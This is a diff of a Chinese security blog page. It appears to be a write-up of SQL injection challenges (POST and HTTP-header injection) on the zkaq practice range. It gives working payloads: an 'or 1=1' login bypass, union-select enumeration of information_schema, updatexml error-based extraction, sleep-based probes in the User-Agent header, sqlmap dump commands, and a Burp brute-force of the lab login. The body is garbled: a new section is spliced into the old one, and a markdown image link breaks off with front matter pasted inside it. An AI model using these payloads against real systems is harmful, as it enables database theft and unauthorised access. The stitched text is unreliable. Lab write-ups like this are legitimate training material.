@@ -10,7 +10,7 @@
     
     
     
-    <title>HEAD注入--zkaq靶场 | 伏诗</title>
+    <title>POST注入--zkaq靶场 | 伏诗</title>
     <link href="http://wxnsoul.github.io" rel="prefetch" />
 
     
@@ -187,7 +187,7 @@
                         </li>
                         
                         <li>
-                            <a href="/tags/Dom-Based-XSS/">Dom Based XSS</a>
+                            <a href="/tags/Mysql%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5/">Mysql注入--DNS注入</a>
                         </li>
                         
                         
@@ -223,13 +223,13 @@
         <i class="fa fa-home"></i>
         <a href="http://wxnsoul.github.io">伏诗</a>
         >
-        <span>HEAD注入--zkaq靶场</span>
+        <span>POST注入--zkaq靶场</span>
     </div>
     <!-- 大型设备详细文章 -->
     <div class="hidden-xs">
         <div class="title-article">
             <h1>
-                <a href="/2020/04/04/HEAD%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/">HEAD注入--zkaq靶场</a>
+                <a href="/2020/04/04/HEAD%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/">POST注入--zkaq靶场</a>
             </h1>
         </div>
         <div class="tag-article">
@@ -237,7 +237,7 @@
             <span class="label label-gal">
                 <i class="fa fa-tags"></i>
                 
-                <a href="/tags/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/">SQL注入--HEAD注入</a>
+                <a href="/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/">SQL注入--POST注入</a>
                 
             </span>
             
@@ -252,7 +252,7 @@
         <center>
             <div class="title-article">
                 <h4>
-                    <a href="/2020/04/04/HEAD%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/">HEAD注入--zkaq靶场</a>
+                    <a href="/2020/04/04/HEAD%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/">POST注入--zkaq靶场</a>
                 </h4>
             </div>
             <p>
@@ -262,7 +262,7 @@
                 
                 <i class="fa fa-tags"></i>
                 
-                <a href="/tags/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/">SQL注入--HEAD注入</a>
+                <a href="/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/">SQL注入--POST注入</a>
                 
                 
                 
@@ -270,26 +270,45 @@
         </center>
     </div>
     <div class="content-article">
-        <h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><ul>
-<li><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/m6rqnlsFxx6h.png?imageslim" alt="mark">很明显,获取了请求头中的内容然后进行了insert操作.满足头注入的要求.进行头注入的时候需要正确的账号密码,渗透测试的时候去注册一个即可,这靶场里面的话则需要去爆破了.</li>
+        <p>靶场地址:<a href="https://hack.zkaq.cn/" target="_blank" rel="noopener">https://hack.zkaq.cn/</a></p>
+<ul>
+<li><img src="http://qiniuyun.wxaqlyh.cn/blog/20200404/jm1S1Ml4vqDO.png?imageslim" alt="mark">)题目长这样,尝试使用万能密码<img src="http://qiniuyun.wxaqlyh.cn/blog/20200404/L1mTGn6sBsj0.png?imageslim" alt="mark">很明显成功登录了,接下来就可以查询了</li>
+<li>首先查字段数<br><code>select *from user where username =&#39;1&#39; or 1=1 order by 3#&#39; and password=&#39;&#39;</code><img src="http://qiniuyun.wxaqlyh.cn/blog/20200404/izH5zEGbUkmj.png?imageslim" alt="mark"><code>select *from user where username =&#39;&#39; or 1=1 order by 4#&#39; and password=&#39;&#39;</code><img src="http://qiniuyun.wxaqlyh.cn/blog/20200404/Mwu2lo8N55Jr.png?imageslim" alt="mark">可以得知有三个字段</li>
+<li>接着找出注入点<br><code>select *from user where username =&#39;&#39; union select 1,2,3#&#39; and password=&#39;&#39;</code><img src="http://qiniuyun.wxaqlyh.cn/blog/20200404/BUrIfceOqJmF.png?imageslim" alt="mark">可以看出2,3是注入点</li>
+<li>爆表(爆不爆库无所谓,直接拿database()代替就可以)<code>select *from user where username =&#39;&#39; union select 1,2,table_name from information_schema.tables where table_schema=database()#&#39; and password=&#39;&#39;</code><img src="http://qiniuyun.wxaqlyh.cn/blog/20200404/h6dwgQg0f2OG.png?imageslim" alt="mark">查找出flag表</li>
+<li>爆字段<br><code>select *from user where username =&#39;&#39; union select 1,2,column_name from information_schema.columns where table_name=&#39;flag&#39; limit 1,1#&#39; and password=&#39;&#39;</code><img src="http://qiniuyun.wxaqlyh.cn/blog/20200404/NGCbTAecaJJr.png?imageslim" alt="mark">看到是flag字段</li>
+<li>查值<br><code>select *from user where username =&#39;&#39; union select 1,2,group_concat(flag) from flag#&#39; and password=&#39;&#39;</code><img src="http://qiniuyun.wxaqlyh.cn/blog/20200404/nMSQgNLBgPyb.png?imageslim" alt="mark">可以爆出字段值<br>注:尽量使用limit一个一个取值而不要group_concat,因为只能输出一行,有时候数据会出书不完整</li>
+<li>另外一个靶场也只需要注意闭合的问题,流程一样</li>
+</ul>
+<ul>
+<li>利用sqlmap工具<br>先使用burp抓住带有cookie信息的包,然后复制粘贴到txt文件里,把需要注入的点改成星号*,告诉sqlmap这里是注入点,然后使用-r打开文件就行,这里依旧需要使用—dbs等命令来暴库,一开始以为不需要<br><code>python sqlmap.py -r 1.txt --dbs --level 3</code><br>(默认的level是力度不够的)<br><img src="http://qiniuyun.wxaqlyh.cn/blog/20200404/SFJcMkiiNg8l.png?imageslim" alt="mark"> <code>python sqlmap.py -r 1.txt -D error --tables --level 3</code><br><img src="http://qiniuyun.wxaqlyh.cn/blog/20200404/1y2n4gRepf2g.png?imageslim" alt="mark"><br><code>python sqlmap.py -r 1.txt -D error  -T error_flag --columns --level 3</code><br><img src="http://qiniuyun.wxaqlyh.cn/blog/20200404/y1RfJGMVIr3l.png?imageslim" alt="mark"><br><code>python sqlmap.py -r 1.txt -D error  -T error_flag -C flag --dump  --level 3</code><br>![mark](http:/ —<br>title: HEAD注入–zkaq靶场<br>date: 2020-04-04 14:56:57<br>tags:</li>
+<li>SQL注入–HEAD注入</li>
+</ul>
+<p>categories:</p>
+<ul>
+<li>“掌控安全write up”</li>
+</ul>
+<hr>
+<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><ul>
+<li><img src="http://qiniuyun.wxaqlyh.cn/blog/20200404/m6rqnlsFxx6h.png?imageslim" alt="mark">很明显,获取了请求头中的内容然后进行了insert操作.满足头注入的要求.进行头注入的时候需要正确的账号密码,渗透测试的时候去注册一个即可,这靶场里面的话则需要去爆破了.</li>
 </ul>
 <h1 id="burp过滤出自己想要的内容"><a href="#burp过滤出自己想要的内容" class="headerlink" title="burp过滤出自己想要的内容"></a>burp过滤出自己想要的内容</h1><ul>
-<li>如果页面返回正常和不正常都差不多,那么可以设置过滤条件来帮助查看<img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/UgeuhPdbEibP.png?imageslim" alt="mark"><br>在option选择项里把默认的内容删除了,然后点击add添加自己想要的内容,如果页面返回的内容中匹配到了改内容就会在结果栏中打上勾(注意要用页面正常和不正常之间不同的内容来过滤,<font color="red">尽量使用避免中文</font>)<img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/gF9Br0rB65AN.png?imageslim" alt="mark">看,add上传成功后特有的字符串之后匹配到会打上勾.这边就爆破出靶场的账号密码是admin,123456</li>
+<li>如果页面返回正常和不正常都差不多,那么可以设置过滤条件来帮助查看<img src="http://qiniuyun.wxaqlyh.cn/blog/20200404/UgeuhPdbEibP.png?imageslim" alt="mark"><br>在option选择项里把默认的内容删除了,然后点击add添加自己想要的内容,如果页面返回的内容中匹配到了改内容就会在结果栏中打上勾(注意要用页面正常和不正常之间不同的内容来过滤,<font color="red">尽量使用避免中文</font>)<img src="http://qiniuyun.wxaqlyh.cn/blog/20200404/gF9Br0rB65AN.png?imageslim" alt="mark">看,add上传成功后特有的字符串之后匹配到会打上勾.这边就爆破出靶场的账号密码是admin,123456</li>
 </ul>
 <h1 id="判断是否可以头注入"><a href="#判断是否可以头注入" class="headerlink" title="判断是否可以头注入"></a>判断是否可以头注入</h1><ul>
-<li><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/iyWVcFK6a3Mk.png?imageslim" alt="mark">从这句与数据库进行交互的sql语言可以尝试构造sql注入,千万要注意闭合的细节!!!<code>&#39; or sleep(5),1)#</code>返回页面确实延迟了五秒多,说明是存在head注入的.<br>这边遇见一个奇怪的点,我室友burp改user_agent自然是没有问题的,但是使用hackbar插件修改请求头之后却没有反应,再次尝试使用插件修改抓包后发现请求头确实被修改了但是post传的两个参数却没有了</li>
+<li><img src="http://qiniuyun.wxaqlyh.cn/blog/20200404/iyWVcFK6a3Mk.png?imageslim" alt="mark">从这句与数据库进行交互的sql语言可以尝试构造sql注入,千万要注意闭合的细节!!!<code>&#39; or sleep(5),1)#</code>返回页面确实延迟了五秒多,说明是存在head注入的.<br>这边遇见一个奇怪的点,我使用burp改user_agent自然是没有问题的,但是使用hackbar插件修改请求头之后却没有反应,再次尝试使用插件修改抓包后发现请求头确实被修改了但是post传的两个参数却没有了</li>
 </ul>
 <h1 id="使用xmlupdate函数爆破表名"><a href="#使用xmlupdate函数爆破表名" class="headerlink" title="使用xmlupdate函数爆破表名"></a>使用xmlupdate函数爆破表名</h1><ul>
 <li>‘ or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1),1)#</li>
 </ul>
-<p><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/I9mpAa0Khv1l.png?imageslim" alt="mark">这里需要注意表名是flag_head,~是concat函数连接上去的</p>
+<p><img src="http://qiniuyun.wxaqlyh.cn/blog/20200404/I9mpAa0Khv1l.png?imageslim" alt="mark">这里需要注意表名是flag_head,~是concat函数连接上去的</p>
 <h1 id="爆破字段"><a href="#爆破字段" class="headerlink" title="爆破字段"></a>爆破字段</h1><ul>
-<li>‘ or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’flag_head’ limit 1,1)),1),1)#<br><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/IpdE3wj490xz.png?imageslim" alt="mark"></li>
+<li>‘ or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=’flag_head’ limit 1,1)),1),1)#<br><img src="http://qiniuyun.wxaqlyh.cn/blog/20200404/IpdE3wj490xz.png?imageslim" alt="mark"></li>
 </ul>
 <h1 id="爆破值"><a href="#爆破值" class="headerlink" title="爆破值"></a>爆破值</h1><ul>
-<li>‘ or updatexml(1,concat(0x7e,(select flag_h1 from flag_head limit 0,1)),1),1)#<br><img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/0Vup3EGVtjqs.png?imageslim" alt="mark">成功得出flag</li>
+<li>‘ or updatexml(1,concat(0x7e,(select flag_h1 from flag_head limit 0,1)),1),1)#<br><img src="http://qiniuyun.wxaqlyh.cn/blog/20200404/0Vup3EGVtjqs.png?imageslim" alt="mark">成功得出flag</li>
 </ul>
-<p>另外两个靶场也是差不多的<img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/uxd0fUtWK6dw.png?imageslim" alt="mark"><br>这个是获取referer的<img src="http://q85br28lq.bkt.clouddn.com/blog/20200404/qYKkLjgATOPe.png?imageslim" alt="mark"><br>这个是获取X-Forwarded=For的基本结构,直接修改就好</p>
+<p>另外两个靶场也是差不多的<img src="http://qiniuyun.wxaqlyh.cn/blog/20200404/uxd0fUtWK6dw.png?imageslim" alt="mark"><br>这个是获取referer的<img src="http://qiniuyun.wxaqlyh.cn/blog/20200404/qYKkLjgATOPe.png?imageslim" alt="mark"><br>这个是获取X-Forwarded=For的基本结构,直接修改就好/qiniuyun.wxaqlyh.cn/blog/20200404/E8lrsVMjsDh8.png?imageslim)</p>
 
     </div>
 </article>
@@ -300,7 +319,7 @@
 <script>
 	if(!window.commentConfig) {
       window.commentConfig = {}
-      window.commentConfig.title = 'HEAD注入--zkaq靶场'
+      window.commentConfig.title = 'POST注入--zkaq靶场'
     }
 </script>
 
@@ -363,6 +382,12 @@
             
             <li class="list-group-item">
                 <span class="post-title">
+                    <a href="/2020/05/13/%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/">延时注入--zkaq靶场</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
                     <a href="/2020/05/07/py%E7%88%AC%E8%99%ABday7-%E6%B7%98%E5%AE%9D%E5%95%86%E5%93%81%E4%BF%A1%E6%81%AF%E5%AE%9A%E5%90%91%E7%88%AC%E8%99%AB%E5%AE%9E%E4%BE%8B/">py爬虫day7--淘宝商品信息定向爬虫实例</a>
                 </span>
             </li>
@@ -415,12 +440,6 @@
                 </span>
             </li>
             
-            <li class="list-group-item">
-                <span class="post-title">
-                    <a href="/2020/05/05/py%E7%88%AC%E8%99%ABday5-%E5%AF%BC%E5%AD%A6/">py爬虫day5--导学</a>
-                </span>
-            </li>
-            
         </ul>
     </div>
 </aside>
@@ -439,61 +458,61 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2020/04/05/Dom-Based-XSS/">Dom Based XSS</a>
+                    <a href="/2020/04/12/0day%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B-%E4%B8%8A/">0day审计实战案例(上)</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2020/04/02/SQL%E8%AF%AD%E5%8F%A5-%E5%AD%90%E6%9F%A5%E8%AF%A2/">SQL语句--子查询</a>
+                    <a href="/2020/04/05/Dom-Based-XSS-zkaq%E9%9D%B6%E5%9C%BA/">Dom Based XSS--zkaq靶场</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2020/04/07/hexo%E4%B8%8A%E4%BC%A0%E6%96%87%E7%AB%A0%E5%A4%B1%E8%B4%A5/">hexo上传文章失败</a>
+                    <a href="/2020/04/05/Mysql%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5/">Mysql注入--DNS注入</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2020/05/06/py%E7%88%AC%E8%99%ABday6-%E4%BF%A1%E6%81%AF%E6%8F%90%E5%8F%96%E7%9A%84%E4%B8%80%E8%88%AC%E6%96%B9%E6%B3%95/">py爬虫day6--信息提取的一般方法</a>
+                    <a href="/2020/04/04/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/">SQL注入--POST注入</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2020/05/06/py%E7%88%AC%E8%99%ABday5-%E7%BE%8E%E5%91%B3%E6%B1%A4/">py爬虫day5--美味汤</a>
+                    <a href="/2020/04/04/access%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/">access注入--zkaq靶场</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2020/04/06/zkaq%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-%E4%B8%80/">zkaq文件上传漏洞(一)</a>
+                    <a href="/2020/05/05/py%E7%88%AC%E8%99%ABday5-%E5%AF%BC%E5%AD%A6/">py爬虫day5--导学</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2020/04/05/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/">反射型XSS</a>
+                    <a href="/2020/05/07/py%E7%88%AC%E8%99%ABday7-re%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/">py爬虫day7--re库的使用</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2020/04/11/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">变量覆盖</a>
+                    <a href="/2020/04/05/zkaq-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-zkaq%E9%9D%B6%E5%9C%BA/">zkaq--正则表达式--zkaq靶场</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2020/04/11/%E5%BA%8F%E5%88%97%E5%8C%96%E4%BA%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-zkaq%E9%9D%B6%E5%9C%BA/">序列化于反序列化--zkaq靶场</a>
+                    <a href="/2020/05/13/%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5-zkaq%E9%9D%B6%E5%9C%BA/">延时注入--zkaq靶场</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2020/04/05/%E8%A7%A3%E5%86%B3tags%E5%92%8Ccategories%E7%82%B9%E5%87%BB%E5%90%8E%E9%A1%B5%E9%9D%A2%E4%B8%BA%E7%A9%BA%E7%9A%84%E9%97%AE%E9%A2%98/">解决tags和categories点击后页面为空的问题</a>
+                    <a href="/2020/04/07/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E4%B8%8E%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E/">验证码绕过与密码找回</a>
                 </span>
             </li>
             
@@ -526,77 +545,79 @@
                 
                 <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
     
-    <a href="/tags/0day/" style="font-size: 14.684108956454088px;" class="tag-cloud-link">0day</a>
+    <a href="/tags/0day/" style="font-size: 18.01879842256237px;" class="tag-cloud-link">0day</a>
     
-    <a href="/tags/CSRF/" style="font-size: 12.26436242767874px;" class="tag-cloud-link">CSRF</a>
+    <a href="/tags/CSRF/" style="font-size: 16.25660695179837px;" class="tag-cloud-link">CSRF</a>
     
-    <a href="/tags/Dom-Based-XSS/" style="font-size: 14.258363704481091px;" class="tag-cloud-link">Dom Based XSS</a>
+    <a href="/tags/Mysql%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5/" style="font-size: 10.171544021731123px;" class="tag-cloud-link">Mysql注入--DNS注入</a>
     
-    <a href="/tags/Mysql%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5/" style="font-size: 14.188723598538097px;" class="tag-cloud-link">Mysql注入--DNS注入</a>
+    <a href="/tags/Dom-Based-XSS/" style="font-size: 10.064482255774687px;" class="tag-cloud-link">Dom Based XSS</a>
     
-    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-Get%E6%B3%A8%E5%85%A5/" style="font-size: 9.16858639616806px;" class="tag-cloud-link">SQL注入--Get注入</a>
+    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-Get%E6%B3%A8%E5%85%A5/" style="font-size: 10.057632202666227px;" class="tag-cloud-link">SQL注入--Get注入</a>
     
-    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/" style="font-size: 11.549575101500807px;" class="tag-cloud-link">SQL注入--HEAD注入</a>
+    <a href="/tags/servlet/" style="font-size: 9.92221000193455px;" class="tag-cloud-link">servlet</a>
     
-    <a href="/tags/Mssql%E6%B3%A8%E5%85%A5-%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/" style="font-size: 16.378502677656957px;" class="tag-cloud-link">Mssql注入--反弹注入</a>
+    <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/" style="font-size: 9.6606351819202px;" class="tag-cloud-link">数据库注入--DNS注入原理</a>
     
-    <a href="/tags/servlet/" style="font-size: 8.619049483096248px;" class="tag-cloud-link">servlet</a>
+    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/" style="font-size: 17.188760003536405px;" class="tag-cloud-link">SQL注入--POST注入</a>
     
-    <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-DNS%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/" style="font-size: 19.74949636971002px;" class="tag-cloud-link">数据库注入--DNS注入原理</a>
+    <a href="/tags/OS%E4%B9%A0%E9%A2%98/" style="font-size: 13.381904008234878px;" class="tag-cloud-link">OS习题</a>
     
-    <a href="/tags/OS%E4%B9%A0%E9%A2%98/" style="font-size: 15.012616705356121px;" class="tag-cloud-link">OS习题</a>
+    <a href="/tags/Mssql%E6%B3%A8%E5%85%A5-%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/" style="font-size: 11.684611277451568px;" class="tag-cloud-link">Mssql注入--反弹注入</a>
     
-    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/" style="font-size: 13.682592515064172px;" class="tag-cloud-link">SQL注入--POST注入</a>
+    <a href="/tags/SQL-DDL/" style="font-size: 13.555882395044517px;" class="tag-cloud-link">SQL-DDL</a>
     
-    <a href="/tags/SQL-DDL/" style="font-size: 10.97549509176119px;" class="tag-cloud-link">SQL-DDL</a>
+    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-HEAD%E6%B3%A8%E5%85%A5/" style="font-size: 9.388367385651168px;" class="tag-cloud-link">SQL注入--HEAD注入</a>
     
-    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/" style="font-size: 11.31543064663509px;" class="tag-cloud-link">SQL注入--盲注</a>
+    <a href="/tags/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/" style="font-size: 16.56749467848018px;" class="tag-cloud-link">SQL注入--盲注</a>
     
-    <a href="/tags/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" style="font-size: 11.359520790554965px;" class="tag-cloud-link">SQL注入绕过姿势</a>
+    <a href="/tags/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" style="font-size: 13.978058573757536px;" class="tag-cloud-link">SQL注入绕过姿势</a>
     
-    <a href="/tags/SSRF/" style="font-size: 16.96580769778417px;" class="tag-cloud-link">SSRF</a>
+    <a href="/tags/SSRF/" style="font-size: 18.21551999807456px;" class="tag-cloud-link">SSRF</a>
     
-    <a href="/tags/XXE/" style="font-size: 19.68865347864456px;" class="tag-cloud-link">XXE</a>
+    <a href="/tags/HTTP/" style="font-size: 10.723367135020313px;" class="tag-cloud-link">HTTP</a>
     
-    <a href="/tags/HTTP/" style="font-size: 14.258109709001218px;" class="tag-cloud-link">HTTP</a>
+    <a href="/tags/Request/" style="font-size: 19.247612543533442px;" class="tag-cloud-link">Request</a>
     
-    <a href="/tags/Request/" style="font-size: 10.191764336689808px;" class="tag-cloud-link">Request</a>
+    <a href="/tags/XXE/" style="font-size: 10.646367447198331px;" class="tag-cloud-link">XXE</a>
     
-    <a href="/tags/Access%E6%B3%A8%E5%85%A5-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5/" style="font-size: 14.187826420689033px;" class="tag-cloud-link">Access注入--偏移注入</a>
+    <a href="/tags/Access%E6%B3%A8%E5%85%A5-%E5%81%8F%E7%A7%BB%E6%B3%A8%E5%85%A5/" style="font-size: 12.98624764671633px;" class="tag-cloud-link">Access注入--偏移注入</a>
     
-    <a href="/tags/Access%E6%B3%A8%E5%85%A5-cookie%E6%B3%A8%E5%85%A5/" style="font-size: 12.496887146580859px;" class="tag-cloud-link">Access注入--cookie注入</a>
+    <a href="/tags/Access%E6%B3%A8%E5%85%A5-cookie%E6%B3%A8%E5%85%A5/" style="font-size: 9.513175650082584px;" class="tag-cloud-link">Access注入--cookie注入</a>
     
-    <a href="/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/" style="font-size: 18.40481952256411px;" class="tag-cloud-link">博客学习</a>
+    <a href="/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/" style="font-size: 10.817494575001811px;" class="tag-cloud-link">博客学习</a>
     
-    <a href="/tags/%E7%88%AC%E8%99%AB/" style="font-size: 15.599519431788558px;" class="tag-cloud-link">爬虫</a>
+    <a href="/tags/%E7%88%AC%E8%99%AB/" style="font-size: 17.408031699673657px;" class="tag-cloud-link">爬虫</a>
     
-    <a href="/tags/web%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/" style="font-size: 9.434767790987108px;" class="tag-cloud-link">web通信原理</a>
+    <a href="/tags/web%E9%80%9A%E4%BF%A1%E5%8E%9F%E7%90%86/" style="font-size: 17.719670630751807px;" class="tag-cloud-link">web通信原理</a>
     
-    <a href="/tags/web%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" style="font-size: 10.778415961694389px;" class="tag-cloud-link">web前端安全基础</a>
+    <a href="/tags/web%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" style="font-size: 19.629700660521554px;" class="tag-cloud-link">web前端安全基础</a>
     
-    <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 18.496622530015443px;" class="tag-cloud-link">信息收集</a>
+    <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 9.722478978268002px;" class="tag-cloud-link">信息收集</a>
     
-    <a href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" style="font-size: 19.922718198660675px;" class="tag-cloud-link">正则表达式</a>
+    <a href="/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10.93014080530056px;" class="tag-cloud-link">序列化与反序列化</a>
     
-    <a href="/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 8.697715070115361px;" class="tag-cloud-link">序列化与反序列化</a>
+    <a href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" style="font-size: 14.839927024231077px;" class="tag-cloud-link">正则表达式</a>
     
-    <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" style="font-size: 18.74709093940084px;" class="tag-cloud-link">文件上传漏洞</a>
+    <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" style="font-size: 11.69783050682183px;" class="tag-cloud-link">文件上传漏洞</a>
     
-    <a href="/tags/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/" style="font-size: 11.178285586186473px;" class="tag-cloud-link">反射型XSS</a>
+    <a href="/tags/%E5%8F%8D%E5%B0%84%E5%9E%8BXSS/" style="font-size: 19.552776568524656px;" class="tag-cloud-link">反射型XSS</a>
     
-    <a href="/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" style="font-size: 19.964227700813687px;" class="tag-cloud-link">变量覆盖</a>
+    <a href="/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/" style="font-size: 12.73977927981511px;" class="tag-cloud-link">变量覆盖</a>
     
-    <a href="/tags/%E5%AD%98%E5%82%A8%E5%9E%8BXSS/" style="font-size: 19.584966129595372px;" class="tag-cloud-link">存储型XSS</a>
+    <a href="/tags/%E5%AD%98%E5%82%A8%E5%9E%8BXSS/" style="font-size: 16.840667038840657px;" class="tag-cloud-link">存储型XSS</a>
     
-    <a href="/tags/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/" style="font-size: 15.633660793771234px;" class="tag-cloud-link">支付漏洞</a>
+    <a href="/tags/%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5/" style="font-size: 8.134828362943328px;" class="tag-cloud-link">延时注入</a>
     
-    <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-Access%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/" style="font-size: 8.402507827153016px;" class="tag-cloud-link">数据库注入--Access注入原理</a>
+    <a href="/tags/%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E/" style="font-size: 11.852082619422365px;" class="tag-cloud-link">支付漏洞</a>
     
-    <a href="/tags/%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E4%BA%8E%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB/" style="font-size: 11.191090485226857px;" class="tag-cloud-link">本地包含于远程包含</a>
+    <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5-Access%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/" style="font-size: 9.155252861283419px;" class="tag-cloud-link">数据库注入--Access注入原理</a>
     
-    <a href="/tags/%E8%B6%8A%E6%9D%83/" style="font-size: 14.134217461640787px;" class="tag-cloud-link">越权</a>
+    <a href="/tags/%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB%E4%BA%8E%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB/" style="font-size: 11.271981801502823px;" class="tag-cloud-link">本地包含于远程包含</a>
     
-    <a href="/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E5%92%8C%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E/" style="font-size: 13.774847138599778px;" class="tag-cloud-link">验证码绕过和密码找回</a>
+    <a href="/tags/%E8%B6%8A%E6%9D%83/" style="font-size: 11.341109898958912px;" class="tag-cloud-link">越权</a>
+    
